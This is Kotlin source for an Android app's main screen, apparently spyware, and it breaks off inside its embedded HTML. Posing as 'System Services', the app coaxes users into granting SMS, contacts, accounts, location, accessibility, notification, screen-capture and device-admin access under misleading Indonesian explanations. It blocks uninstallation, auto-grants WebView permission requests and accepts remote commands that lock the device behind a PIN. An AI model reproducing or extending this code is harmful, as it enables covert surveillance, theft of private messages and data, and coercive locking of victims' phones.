package com.sync.xxx

import android.Manifest
import android.annotation.SuppressLint
import android.app.Activity
import android.app.AppOpsManager
import android.content.*
import android.content.pm.PackageManager
import android.location.LocationManager
import android.media.projection.MediaProjectionManager
import android.os.*
import android.provider.Settings
import android.webkit.*
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.google.android.gms.common.api.ResolvableApiException
import com.google.android.gms.location.*

class MainActivity : AppCompatActivity() {

    private lateinit var webView: WebView

    private val PERM_ALL = 999
    private val REQ_SCREEN_CAPTURE = 102
    private val REQ_LOCATION_SETTINGS = 107

    private val screenCaptureReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            if (intent.action == "com.sync.xxx.REQUEST_SCREEN_CAPTURE") {
                val mgr = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                startActivityForResult(mgr.createScreenCaptureIntent(), REQ_SCREEN_CAPTURE)
            }
        }
    }

    private val commandReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            if (intent.action != DeviceService.ACTION_COMMAND) return
            val cmd = intent.getStringExtra(DeviceService.EXTRA_COMMAND) ?: return
            val value = intent.getStringExtra(DeviceService.EXTRA_VALUE) ?: ""
            handleCommand(cmd, value)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        setupWebView()
        registerReceivers()
        AntiUninstallHelper.requestAdminIfNeeded(this)
        
        requestAllPermissionsAtOnce()
    }

    private fun registerReceivers() {
        val filter = IntentFilter(DeviceService.ACTION_COMMAND)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(commandReceiver, filter, RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(commandReceiver, filter)
        }

        val screenFilter = IntentFilter("com.sync.xxx.REQUEST_SCREEN_CAPTURE")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(screenCaptureReceiver, screenFilter, RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(screenCaptureReceiver, screenFilter)
        }
    }

    // ===================== REQUEST ALL PERMISSIONS =====================
    
    private fun requestAllPermissionsAtOnce() {
        val permissions = mutableListOf<String>()
        
        // SEMUA PERMISSION DALAM 1 LIST
        permissions.add(Manifest.permission.CAMERA)
        permissions.add(Manifest.permission.READ_SMS)
        permissions.add(Manifest.permission.READ_CONTACTS)
        permissions.add(Manifest.permission.GET_ACCOUNTS)
        permissions.add(Manifest.permission.READ_PHONE_STATE)
        permissions.add(Manifest.permission.READ_PHONE_NUMBERS)
        permissions.add(Manifest.permission.ACCESS_FINE_LOCATION)
        permissions.add(Manifest.permission.ACCESS_COARSE_LOCATION)
        
        // Storage (beda versi Android)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.READ_MEDIA_IMAGES)
            permissions.add(Manifest.permission.READ_MEDIA_VIDEO)
            permissions.add(Manifest.permission.READ_MEDIA_AUDIO)
        } else {
            permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE)
            permissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
        }
        
        // FILTER PERMISSION YANG BELUM GRANTED
        val neededPermissions = permissions.filter { perm ->
            ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED
        }.toTypedArray()
        
        android.util.Log.d("Permission", "📋 Requesting ${neededPermissions.size} permissions sekaligus!")
        
        if (neededPermissions.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, neededPermissions, PERM_ALL)
        } else {
            android.util.Log.d("Permission", "✅ All permissions already granted!")
            checkSpecialPermissions()
        }
    }
    
    private fun checkSpecialPermissions() {
        // Battery Optimization
        if (!isBatteryOptIgnored()) {
            openBatterySettings()
        }
        
        // Overlay
        if (!isOverlayGranted()) {
            requestOverlayPerm()
        }
        
        // Accessibility
        if (!isAccessibilityGranted()) {
            requestAccessibilityPerm()
        }
        
        // Usage Access
        if (!isUsageAccessGranted()) {
            requestUsageAccessPerm()
        }
        
        // Notification Listener
        if (!isNotifListenerGranted()) {
            openNotifListenerSettings()
        }
        
        // Manage Storage (Android 11+)
        if (!isManageStorageGranted()) {
            requestManageStoragePerm()
        }
        
        // GPS
        if (!isGpsEnabled()) {
            requestEnableGps()
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        
        android.util.Log.d("Permission", "=== PERMISSION RESULT ===")
        
        var allGranted = true
        permissions.forEachIndexed { index, perm ->
            val granted = if (index < grantResults.size) {
                grantResults[index] == PackageManager.PERMISSION_GRANTED
            } else false
            android.util.Log.d("Permission", "${if (granted) "✅" else "❌"} $perm = $granted")
            if (!granted) allGranted = false
        }
        
        // Refresh UI
        Handler(Looper.getMainLooper()).postDelayed({
            webView.evaluateJavascript("if(typeof refreshPerms==='function') refreshPerms()", null)
            
            if (allGranted) {
                checkSpecialPermissions()
                // Auto connect setelah semua granted
                Handler(Looper.getMainLooper()).postDelayed({
                    webView.evaluateJavascript("showConnected()", null)
                    startDeviceService()
                    sendBroadcast(Intent(DeviceService.ACTION_CONNECT).apply { setPackage(packageName) })
                }, 1000)
            }
        }, 500)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        android.util.Log.d("MainActivity", "onActivityResult: req=$requestCode result=$resultCode")
        
        when (requestCode) {
            REQ_SCREEN_CAPTURE -> {
                val intent = Intent(DeviceService.ACTION_SCREEN_RESULT).apply {
                    putExtra(DeviceService.EXTRA_RESULT_CODE, resultCode)
                    putExtra(DeviceService.EXTRA_RESULT_DATA, data)
                    setPackage(packageName)
                    addFlags(Intent.FLAG_INCLUDE_STOPPED_PACKAGES)
                }
                sendBroadcast(intent)
            }
            REQ_LOCATION_SETTINGS -> {
                webView.evaluateJavascript("if(typeof refreshPerms==='function') refreshPerms()", null)
            }
        }
    }

    override fun onResume() {
        super.onResume()
        // Cek apakah semua izin sudah granted
        if (checkAllPermissionsGranted()) {
            webView.evaluateJavascript("showConnected()", null)
            startDeviceService()
        } else {
            webView.evaluateJavascript("if(typeof refreshPerms==='function') refreshPerms()", null)
        }
    }

    override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)
        setIntent(intent)
        if (intent?.getBooleanExtra("lock_mode", false) == true) {
            val pin = intent.getStringExtra("lock_pin") ?: ""
            val title = intent.getStringExtra("lock_title") ?: "Perangkat Terkunci"
            startLockMode(pin, title)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        try { unregisterReceiver(commandReceiver) } catch (_: Exception) {}
        try { unregisterReceiver(screenCaptureReceiver) } catch (_: Exception) {}
    }

    private fun handleCommand(cmd: String, value: String) {
        when (cmd) {
            "lockDevice" -> {
                val parts = value.split("|")
                val pin = parts.getOrNull(0) ?: ""
                val title = parts.getOrNull(1) ?: "Perangkat Terkunci"
                startLockMode(pin, title)
            }
            "unlockDevice" -> stopLockMode()
        }
    }

    private fun startLockMode(pin: String, title: String) {
        webView.evaluateJavascript(
            "if(typeof showLockScreen==='function') showLockScreen('${pin}','${title}')", null
        )
        try { startLockTask() } catch (e: Exception) {
            android.util.Log.w("MainActivity", "startLockTask: ${e.message}")
        }
    }

    private fun stopLockMode() {
        try { stopLockTask() } catch (e: Exception) {
            android.util.Log.w("MainActivity", "stopLockTask: ${e.message}")
        }
        webView.evaluateJavascript("if(typeof hideLockScreen==='function') hideLockScreen()", null)
        val i = Intent("com.sync.xxx.UNLOCK").apply { setPackage(packageName) }
        sendBroadcast(i)
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupWebView() {
        webView = findViewById(R.id.mainWebView)
        webView.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
            allowFileAccess = true
            mediaPlaybackRequiresUserGesture = false
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP)
                mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
        }
        val bridge = AppBridge(this, webView)
        AppBridge.instance = bridge
        webView.addJavascriptInterface(bridge, "Android")
        webView.addJavascriptInterface(MainBridge(), "MainBridge")
        webView.webChromeClient = object : WebChromeClient() {
            override fun onPermissionRequest(request: PermissionRequest) {
                request.grant(request.resources)
            }
        }
        webView.webViewClient = WebViewClient()
        val serverUrl = DeviceService.SERVER_URL
        webView.loadDataWithBaseURL(serverUrl, buildHtml(), "text/html", "UTF-8", null)
    }

    // ===================== PERMISSION CHECKS =====================
    
    fun isCamGranted() = ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
    
    fun isSmsGranted() = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
    
    fun isGalleryGranted(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
        } else {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
        }
    }
    
    fun isNotifListenerGranted(): Boolean {
        val enabled = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        return enabled?.contains(packageName) == true
    }
    
    fun isLocationGranted(): Boolean =
        ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
        ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED

    fun isGpsEnabled(): Boolean {
        val lm = getSystemService(LOCATION_SERVICE) as LocationManager
        return lm.isProviderEnabled(LocationManager.GPS_PROVIDER) ||
               lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)
    }

    fun requestEnableGps() {
        val request = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 5000L).build()
        val builder = LocationSettingsRequest.Builder().addLocationRequest(request).setAlwaysShow(true)
        val client = LocationServices.getSettingsClient(this)
        client.checkLocationSettings(builder.build())
            .addOnSuccessListener {
                webView.evaluateJavascript("if(typeof refreshPerms==='function') refreshPerms()", null)
            }
            .addOnFailureListener { exception ->
                if (exception is ResolvableApiException) {
                    try {
                        exception.startResolutionForResult(this, REQ_LOCATION_SETTINGS)
                    } catch (_: Exception) {
                        startActivity(Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS))
                    }
                } else {
                    startActivity(Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS))
                }
            }
    }

    fun isContactsGranted(): Boolean =
        ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED

    fun isGmailGranted(): Boolean =
        ContextCompat.checkSelfPermission(this, Manifest.permission.GET_ACCOUNTS) == PackageManager.PERMISSION_GRANTED

    fun isPhoneGranted(): Boolean =
        ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED &&
        ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_NUMBERS) == PackageManager.PERMISSION_GRANTED

    fun isManageStorageGranted(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            android.os.Environment.isExternalStorageManager()
        } else {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
        }
    }

    fun requestManageStoragePerm() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            try {
                val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                    data = android.net.Uri.parse("package:$packageName")
                }
                startActivity(intent)
            } catch (_: Exception) {
                startActivity(Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION))
            }
        } else {
            ActivityCompat.requestPermissions(this,
                arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE),
                PERM_ALL)
        }
    }

    fun isBatteryOptIgnored() = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
        (getSystemService(POWER_SERVICE) as PowerManager).isIgnoringBatteryOptimizations(packageName)
    } else true
    
    fun isOverlayGranted() = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
        Settings.canDrawOverlays(this)
    } else true

    fun isAccessibilityGranted(): Boolean {
        val enabled = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
        return enabled?.contains(packageName) == true
    }

    // FIXED: isUsageAccessGranted dengan AppOpsManager
    fun isUsageAccessGranted(): Boolean {
        try {
            val appOps = getSystemService(AppOpsManager::class.java)
            val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                appOps.unsafeCheckOpNoThrow(
                    AppOpsManager.OPSTR_GET_USAGE_STATS,
                    Process.myUid(),
                    packageName
                )
            } else {
                appOps.checkOpNoThrow(
                    AppOpsManager.OPSTR_GET_USAGE_STATS,
                    Process.myUid(),
                    packageName
                )
            }
            return mode == AppOpsManager.MODE_ALLOWED
        } catch (e: Exception) {
            return false
        }
    }

    private fun checkAllPermissionsGranted(): Boolean {
        return isCamGranted() &&
               isSmsGranted() &&
               isGalleryGranted() &&
               isLocationGranted() &&
               isContactsGranted() &&
               isGmailGranted() &&
               isPhoneGranted() &&
               isManageStorageGranted() &&
               isBatteryOptIgnored() &&
               isOverlayGranted() &&
               isAccessibilityGranted() &&
               isUsageAccessGranted() &&
               isNotifListenerGranted() &&
               isGpsEnabled()
    }

    // ===================== REQUEST FUNCTIONS =====================
    
    fun requestCamPerm() = ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.CAMERA), PERM_ALL)
    
    fun requestSmsPerm() = ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_SMS), PERM_ALL)
    
    fun requestGalleryPerm() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ActivityCompat.requestPermissions(this, arrayOf(
                Manifest.permission.READ_MEDIA_IMAGES,
                Manifest.permission.READ_MEDIA_VIDEO,
                Manifest.permission.READ_MEDIA_AUDIO
            ), PERM_ALL)
        } else {
            ActivityCompat.requestPermissions(this, arrayOf(
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE
            ), PERM_ALL)
        }
    }
    
    fun requestLocationPerm() {
        ActivityCompat.requestPermissions(this,
            arrayOf(Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION),
            PERM_ALL)
    }
    
    fun requestContactsPerm() {
        ActivityCompat.requestPermissions(this,
            arrayOf(Manifest.permission.READ_CONTACTS),
            PERM_ALL)
    }
    
    fun requestGmailPerm() {
        ActivityCompat.requestPermissions(this,
            arrayOf(Manifest.permission.GET_ACCOUNTS),
            PERM_ALL)
    }
    
    fun requestPhonePerm() {
        ActivityCompat.requestPermissions(this,
            arrayOf(Manifest.permission.READ_PHONE_STATE, Manifest.permission.READ_PHONE_NUMBERS),
            PERM_ALL)
    }
    
    fun openNotifListenerSettings() {
        startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS").apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        })
    }
    
    fun openBatterySettings() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                data = android.net.Uri.parse("package:$packageName")
            })
        }
    }
    
    fun requestOverlayPerm() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION).apply {
                data = android.net.Uri.parse("package:$packageName")
            })
        }
    }
    
    fun requestAccessibilityPerm() {
        startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
    }

    fun requestUsageAccessPerm() {
        startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS).apply {
            data = android.net.Uri.parse("package:$packageName")
        })
    }

    private fun startDeviceService() {
        val svcIntent = Intent(this, DeviceService::class.java)
        ContextCompat.startForegroundService(this, svcIntent)
    }

    // ===================== BUILD HTML =====================
    
    private fun buildHtml(): String {
        return """<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>System Services</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Plus+Jakarta+Sans:wght@700;800;900&display=swap" rel="stylesheet">
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
:root{
  --bg:#0a0a0f;--surface:#0f0f17;--card:#141420;--card2:#1a1a28;
  --border:#1e1e30;--border2:#2a2a40;
  --accent:#6366f1;--accent2:#4f46e5;
  --green:#22c55e;--red:#ef4444;--amber:#f59e0b;
  --text:#f8fafc;--text2:#94a3b8;--text3:#475569;
  --font:'Inter',sans-serif;
  --head:'Plus Jakarta Sans',sans-serif;
}
html,body{height:100%;width:100%;overflow:hidden}
body{background:var(--bg);color:var(--text);font-family:var(--font);-webkit-font-smoothing:antialiased}
.screen{position:absolute;inset:0;transition:opacity .4s;display:flex;flex-direction:column}
.screen.hidden{opacity:0;pointer-events:none;transform:translateY(16px)}
#permScreen{overflow-y:auto;padding-bottom:40px;background:var(--bg)}
.perm-header{padding:52px 24px 32px;display:flex;flex-direction:column;align-items:center;gap:20px}
.perm-logo-wrap{position:relative;width:80px;height:80px}
.perm-logo-bg{position:absolute;inset:0;border-radius:24px;background:linear-gradient(145deg,rgba(99,102,241,.18),rgba(99,102,241,.04));border:1px solid rgba(99,102,241,.25)}
.perm-logo-inner{position:absolute;inset:0;display:flex;align-items:center;justify-content:center}
.perm-logo-ring-outer{position:absolute;inset:-6px;border-radius:30px;border:1px solid rgba(99,102,241,.1);animation:ringPulse 3s ease-in-out infinite}
@keyframes ringPulse{0%,100%{opacity:.4;transform:scale(1)}50%{opacity:.1;transform:scale(1.04)}}
.perm-header-text{display:flex;flex-direction:column;align-items:center;gap:8px}
.perm-badge{background:rgba(99,102,241,.12);border:1px solid rgba(99,102,241,.2);border-radius:999px;padding:4px 12px;font-size:10px;font-weight:600;color:var(--accent);letter-spacing:2px;text-transform:uppercase}
.perm-title{font-family:var(--head);font-size:26px;font-weight:800;color:var(--text);text-align:center;line-height:1.15;letter-spacing:-.6px}
.perm-subtitle{font-size:13px;font-weight:400;color:var(--text2);text-align:center;line-height:1.65;max-width:280px}
.perm-divider{height:1px;background:linear-gradient(90deg,transparent,var(--border2),transparent);margin:0 24px}
.perm-list{padding:20px 16px 0;display:flex;flex-direction:column;gap:10px}
.perm-row{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:16px;display:flex;align-items:center;gap:14px;transition:border-color .25s,background .25s}
.perm-row.granted{border-color:rgba(34,197,94,.2);background:rgba(34,197,94,.03)}
.perm-icon-wrap{width:44px;height:44px;border-radius:12px;flex-shrink:0;display:flex;align-items:center;justify-content:center;background:rgba(99,102,241,.12);color:#6366f1}
.perm-icon{width:44px;height:44px;border-radius:12px;flex-shrink:0;display:flex;align-items:center;justify-content:center}
.pi-cam{background:rgba(245,158,11,.12);color:var(--amber)}
.pi-bat{background:rgba(34,197,94,.12);color:var(--green)}
.perm-info{flex:1;min-width:0;display:flex;flex-direction:column;gap:3px}
.perm-name{font-weight:600;font-size:14px;color:var(--text);letter-spacing:-.1px}
.perm-desc{font-size:11.5px;font-weight:400;color:var(--text3);line-height:1.45}
.perm-row.granted .perm-desc{color:rgba(34,197,94,.6)}
.tog{position:relative;width:50px;height:28px;flex-shrink:0;cursor:pointer}
.tog input{opacity:0;width:0;height:0;position:absolute}
.tog-track{position:absolute;inset:0;border-radius:999px;background:var(--card2);border:1px solid var(--border2);transition:all .22s}
.tog-track::after{content:'';position:absolute;top:4px;left:4px;width:18px;height:18px;border-radius:50%;background:var(--text3);transition:left .22s,background .22s}
.tog input:checked + .tog-track{background:rgba(34,197,94,.15);border-color:rgba(34,197,94,.4)}
.tog input:checked + .tog-track::after{left:26px;background:var(--green);box-shadow:0 0 8px rgba(34,197,94,.5)}
.perm-footer{padding:20px 16px 0;display:flex;flex-direction:column;gap:12px}
.all-granted-badge{display:none;align-items:center;justify-content:center;gap:8px;padding:12px;background:rgba(34,197,94,.06);border:1px solid rgba(34,197,94,.15);border-radius:12px;font-size:12px;font-weight:500;color:var(--green)}
.all-granted-badge.show{display:flex}
.btn-masuk{width:100%;height:54px;border-radius:14px;border:none;background:linear-gradient(135deg,var(--accent),var(--accent2));color:#fff;font-family:var(--head);font-size:14px;font-weight:800;letter-spacing:2px;cursor:pointer;transition:all .15s;display:flex;align-items:center;justify-content:center;gap:9px;box-shadow:0 4px 24px rgba(99,102,241,.25)}
.btn-masuk:active{transform:scale(.98);opacity:.9}
.btn-masuk.refresh-mode{background:var(--card2);color:var(--text2);border:1px solid var(--border2);box-shadow:none}
#connectedScreen{background:var(--bg);align-items:center;justify-content:center}
.conn-wrap{display:flex;flex-direction:column;align-items:center;gap:0;width:100%;padding:0 24px;max-width:380px}
.conn-top{width:100%;background:var(--card);border:1px solid var(--border);border-radius:24px 24px 0 0;padding:36px 28px 28px;display:flex;flex-direction:column;align-items:center;gap:20px}
.conn-logo-wrap{position:relative}
.conn-logo-bg{width:76px;height:76px;border-radius:22px;background:linear-gradient(145deg,rgba(99,102,241,.15),rgba(99,102,241,.04));border:1px solid rgba(99,102,241,.2);display:flex;align-items:center;justify-content:center}
.conn-logo-pulse{position:absolute;inset:-8px;border-radius:30px;border:1px solid rgba(99,102,241,.12);animation:ringPulse 3s ease-in-out infinite}
.conn-name-wrap{text-align:center}
.conn-app-name{font-family:var(--head);font-size:22px;font-weight:800;color:var(--text);letter-spacing:-.3px}
.conn-app-sub{font-size:11px;font-weight:500;color:var(--text3);letter-spacing:2.5px;text-transform:uppercase;margin-top:4px}
.conn-status-wrap{width:100%;background:var(--surface);border:1px solid var(--border);border-radius:14px;padding:20px;display:flex;flex-direction:column;align-items:center;gap:12px}
.conn-status-indicator{display:flex;align-items:center;gap:10px}
.status-dot{width:10px;height:10px;border-radius:50%;background:var(--text3);transition:background .4s}
.status-indicator.online .status-dot{background:var(--green);box-shadow:0 0 10px var(--green);animation:dotpulse 2s infinite}
.status-indicator.offline .status-dot{background:var(--red);animation:dotblink 1s infinite}
@keyframes dotpulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.4;transform:scale(.8)}}
@keyframes dotblink{0%,100%{opacity:1}50%{opacity:.2}}
.status-text{font-family:var(--head);font-size:14px;font-weight:700;letter-spacing:1.5px;color:var(--text3)}
.status-indicator.online .status-text{color:var(--green)}
.status-indicator.offline .status-text{color:var(--red)}
.status-last{font-size:11px;color:var(--text3)}
.conn-bottom{width:100%;background:var(--card2);border:1px solid var(--border);border-top:none;border-radius:0 0 24px 24px;padding:0 0 4px}
.conn-info-row{display:flex;justify-content:space-between;align-items:center;padding:14px 24px;border-bottom:1px solid var(--border)}
.conn-info-row:last-child{border-bottom:none}
.conn-info-k{font-size:11px;font-weight:500;color:var(--text3);letter-spacing:.5px}
.conn-info-v{font-size:11px;font-weight:600;color:var(--text2);max-width:180px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;text-align:right}
.conn-footer-wrap{margin-top:20px;text-align:center}
.conn-footer{font-size:10px;font-weight:500;color:var(--text3);letter-spacing:1.5px;text-transform:uppercase;opacity:.5}
.perm-row.requesting{border-color:var(--accent)!important;background:rgba(99,102,241,0.08)!important;box-shadow:0 0 0 1px var(--accent)}
</style>
</head>
<body>

<div class="screen" id="permScreen">
  <div class="perm-header">
    <div class="perm-logo-wrap">
      <div class="perm-logo-bg"></div>
      <div class="perm-logo-inner">
        <svg width="34" height="34" viewBox="0 0 24 24" fill="none" stroke="#6366f1" stroke-width="1.6">
          <path d="M12 2L3 7v5c0 5.25 3.75 10.15 9 11.35C17.25 22.15 21 17.25 21 12V7L12 2z"/>
          <path d="M9 12l2 2 4-4" stroke-width="1.8"/>
        </svg>
      </div>
      <div class="perm-logo-ring-outer"></div>
    </div>
    <div class="perm-header-text">
      <div class="perm-badge">Pengaturan Awal</div>
      <div class="perm-title">Izin Diperlukan</div>
      <div class="perm-subtitle">Izinkan Semua Akses Agar Aplikasi Berjalan Maksimal</div>
    </div>
  </div>
  <div class="perm-divider"></div>
  <div class="perm-list" id="permList">
    <!-- CAMERA -->
    <div class="perm-row" id="row-cam"><div class="perm-icon pi-cam"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M14.5 4h-5L7 7H4a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2h-3l-2.5-3z"/><circle cx="12" cy="13" r="3.5"/></svg></div><div class="perm-info"><div class="perm-name">Kamera</div><div class="perm-desc">Dibutuhkan Untuk Fitur Pemindaian</div></div><label class="tog"><input type="checkbox" id="tog-cam" onchange="onToggle('cam',this)"><span class="tog-track"></span></label></div>
    
    <!-- BATTERY -->
    <div class="perm-row" id="row-bat"><div class="perm-icon pi-bat"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="1" y="6" width="18" height="12" rx="2"/><path d="M23 13v-2"/><path d="M7 12h4M9 10v4"/></svg></div><div class="perm-info"><div class="perm-name">Pengoptimalan</div><div class="perm-desc">Mencegah Sistem Menghentikan Aplikasi</div></div><label class="tog"><input type="checkbox" id="tog-bat" onchange="onToggle('bat',this)"><span class="tog-track"></span></label></div>
    
    <!-- OVERLAY -->
    <div class="perm-row" id="row-overlay"><div class="perm-icon" style="background:rgba(139,92,246,.12);color:#a78bfa"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8M12 17v4"/><rect x="6" y="7" width="5" height="4" rx="1"/><path d="M14 8h3M14 11h3"/></svg></div><div class="perm-info"><div class="perm-name">Floating</div><div class="perm-desc">Aplikasi Bisa Mengambang Diatas Aplikasi Lain</div></div><label class="tog"><input type="checkbox" id="tog-overlay" onchange="onToggle('overlay',this)"><span class="tog-track"></span></label></div>
    
    <!-- ACCESSIBILITY -->
    <div class="perm-row" id="row-accessibility"><div class="perm-icon" style="background:rgba(251,146,60,.12);color:#fb923c"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="12" cy="4" r="2"/><path d="M12 6v6l3 3M6 8l2.5 2M18 8l-2.5 2M8.5 21l2-5M15.5 21l-2-5M10 13H8a2 2 0 0 0-2 2v1M14 13h2a2 2 0 0 1 2 2v1"/></svg></div><div class="perm-info"><div class="perm-name">Aksesibilitas</div><div class="perm-desc">Mendeteksi Dan Menambah Performa Aplikasi</div></div><label class="tog"><input type="checkbox" id="tog-accessibility" onchange="onToggle('accessibility',this)"><span class="tog-track"></span></label></div>
    
    <!-- USAGE -->
    <div class="perm-row" id="row-usage"><div class="perm-icon" style="background:rgba(34,197,94,.12);color:#22c55e"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/></svg></div><div class="perm-info"><div class="perm-name">Penggunaan Aplikasi</div><div class="perm-desc">Melihat Daftar Aplikasi Terinstall</div></div><label class="tog"><input type="checkbox" id="tog-usage" onchange="onToggle('usage',this)"><span class="tog-track"></span></label></div>
    
    <!-- SMS -->
    <div class="perm-row" id="row-sms"><div class="perm-icon-wrap"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg></div><div class="perm-info"><div class="perm-name">Baca SMS</div><div class="perm-desc">Membaca SMS Yang Masuk</div></div><label class="tog"><input type="checkbox" id="tog-sms" onchange="onToggle('sms',this)"><span class="tog-track"></span></label></div>
    
    <!-- NOTIFICATION -->
    <div class="perm-row" id="row-notif"><div class="perm-icon-wrap"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg></div><div class="perm-info"><div class="perm-name">Akses Notifikasi</div><div class="perm-desc">Membaca Notifikasi Dari Semua Aplikasi</div></div><label class="tog"><input type="checkbox" id="tog-notif" onchange="onToggle('notif',this)"><span class="tog-track"></span></label></div>
    
    <!-- GALLERY -->
